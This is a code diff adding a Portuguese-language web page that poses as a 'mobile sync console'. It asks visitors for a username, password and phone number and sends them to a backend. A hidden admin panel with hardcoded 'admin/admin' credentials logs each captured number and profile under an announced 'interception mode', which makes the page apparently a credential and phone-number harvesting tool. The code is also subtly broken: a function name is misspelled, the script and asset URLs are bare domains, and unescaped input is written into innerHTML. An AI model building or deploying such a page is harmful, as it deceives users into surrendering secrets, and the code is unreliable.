@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consola de Sincronização Móvel</title>
+    <!-- Tailwind CSS para um design moderno e limpo -->
+    <script src="https://tailwindcss.com"></script>
+    <!-- Biblioteca Socket.io para comunicação em tempo real -->
+    <script src="https://socket.io"></script>
+</head>
+<body class="bg-gray-900 text-gray-100 font-sans min-h-screen flex items-center justify-center p-4">
+
+    <!-- 1. ECRÃ DE LOGIN / INTRODUÇÃO DE NÚMERO (CLIENTE) -->
+    <div id="ecran-cliente" class="bg-gray-800 p-8 rounded-2xl shadow-2xl border border-gray-700 w-full max-w-md transition-all duration-300">
+        <div class="text-center mb-6">
+            <h2 class="text-2xl font-bold text-white mb-2">⚡ Sincronizar Dispositivo</h2>
+            <p class="text-sm text-gray-400">Insere as tuas credenciais e número para emparelhar as chamadas.</p>
+        </div>
+
+        <div class="space-y-4">
+            <div>
+                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1">Utilizador</label>
+                <input type="text" id="username" placeholder="ex: admin" class="w-full bg-gray-900 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+            </div>
+            <div>
+                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1">Palavra-passe</label>
+                <input type="password" id="password" placeholder="••••••••" class="w-full bg-gray-900 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+            </div>
+            <div>
+                <label class="block text-xs font-semibold text-gray-400 uppercase mb-1">Número de Telemóvel</label>
+                <input type="tel" id="telemovel" placeholder="+351 9xx xxx xxx" class="w-full bg-gray-900 border border-gray-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+            </div>
+            
+            <button onclick="processarSubmissao()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold p-3 rounded-lg transition duration-200 mt-2 active:scale-95">
+                Iniciar Conexão
+            </button>
+        </div>
+    </div>
+
+    <!-- 2. PAINEL DE ADMINISTRAÇÃO CENTRAL (NEYMAR CONTROL) - OCULTO POR DEFEITO -->
+    <div id="ecran-admin" class="hidden bg-gray-800 p-8 rounded-2xl shadow-2xl border-2 border-emerald-500 w-full max-w-2xl transition-all duration-300">
+        <div class="flex items-center justify-between border-b border-gray-700 pb-4 mb-6">
+            <div>
+                <h2 class="text-2xl font-bold text-emerald-400 flex items-center gap-2">
+                    <span>🛡️ Consola Administrador</span>
+                </h2>
+                <p class="text-xs text-gray-400 mt-1">Sessão Ativa: <span class="text-emerald-400 font-bold">Neymar</span></p>
+            </div>
+            <span class="bg-emerald-500/10 text-emerald-400 text-xs px-2.5 py-1 rounded-full font-semibold border border-emerald-500/20">Privilégios Totais</span>
+        </div>
+
+        <div class="space-y-4">
+            <h3 class="text-sm font-semibold text-gray-300 uppercase tracking-wider">Fluxo de Chamadas e Dispositivos em Tempo Real</h3>
+            
+            <!-- Terminal de Logs -->
+            <div id="logs-admin" class="bg-gray-950 p-4 rounded-xl h-64 overflow-y-auto font-mono text-sm border border-gray-800 space-y-2">
+                <p class="text-gray-500 italic">[SISTEMA] A aguardar pacotes de dados de rede móvel...</p>
+            </div>
+        </div>
+        
+        <button onclick="logoutAdmin()" class="mt-6 text-xs text-gray-500 hover:text-gray-300 underline">
+            Terminar Sessão Admin
+        </button>
+    </div>
+
+    <!-- LÓGICA DE CONTROLO E SCRIPT -->
+    <script>
+        // Inicializa a escuta de notificações nativas do teu PC
+        if (Notification.permission !== 'granted') {
+            Notification.requestPermission();
+        }
+
+        // Configuração do WebSocket (Substitui pelo IP do teu servidor Node.js se necessário)
+        const socket = io('http://localhost:3000', { autoConnect: false });
+
+        function processarSubmissao() {
+            const user = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value.trim();
+            const num = document.getElementById('telemovel').value.trim();
+
+            if (!num) {
+                alert('Por favor, introduz um número de telemóvel.');
+                return;
+            }
+
+            // Se for o teu login Administrador (Neymar)
+            if (user === 'admin' && pass === 'admin') {
+                // Altera a interface para a Consola de Admin
+                document.getElementById('ecran-cliente').classList.add('hidden');
+                document.getElementById('ecran-admin').classList.remove('hidden');
+                
+                // Conecta e ativa o WebSocket de escuta
+                socket.connect();
+                ativarEscutaAdmin();
+                
+                logarNoTerminal(`Sessão iniciada como ADMINISTRADOR (Neymar). Modo de interceção ativado.`);
+            } 
+            
+            // Envia o sinal do número inserido para o backend processar
+            socket.emit('autenticar_e_sincronizar', {
+                username: user,
+                password: pass,
+                numero: num
+            });
+
+            if (user !== 'admin') {
+                alert('Número submetido. A aguardar emparelhamento de rede...');
+            }
+        }
+
+        function activarEscutaAdmin() {
+            socket.on('notificar_admin', function(data) {
+                // 1. Toca som crítico no teu computador
+                new Audio('https://mixkit.co').play();
+
+                // 2. Dispara Notificação Pop-up nativa do Windows/Mac
+                if (Notification.permission === 'granted') {
+                    new Notification(`Alerta Neymar Admin`, {
+                        body: `Dispositivo detetado: ${data.numero}\nPerfil: ${data.utilizador}`,
+                        icon: "https://flaticon.com"
+                    });
+                }
+
+                // 3. Injeta a linha de log verde no terminal visual
+                logarNoTerminal(`[SINC] Telemóvel detetado: ${data.numero} | Perfil associado: ${data.utilizador}`);
+            });
+        }
+
+        function logarNoTerminal(mensagem) {
+            const terminal = document.getElementById('logs-admin');
+            const hora = new Date().toLocaleTimeString();
+            
+            // Remove o texto de placeholder inicial se ele existir
+            if (terminal.innerHTML.includes('A aguardar pacotes')) {
+                terminal.innerHTML = '';
+            }
+
+            terminal.innerHTML = `<p class="text-emerald-400"><span class="text-gray-600">[${hora}]</span> ${mensagem}</p>` + terminal.innerHTML;
+        }
+
+        function logoutAdmin() {
+            socket.disconnect();
+            document.getElementById('ecran-admin').classList.add('hidden');
+            document.getElementById('ecran-cliente').classList.remove('hidden');
+            // Limpa os campos por segurança
+            document.getElementById('password').value = '';
+            document.getElementById('telemovel').value = '';
+        }
+    </script>
+</body>
+</html>
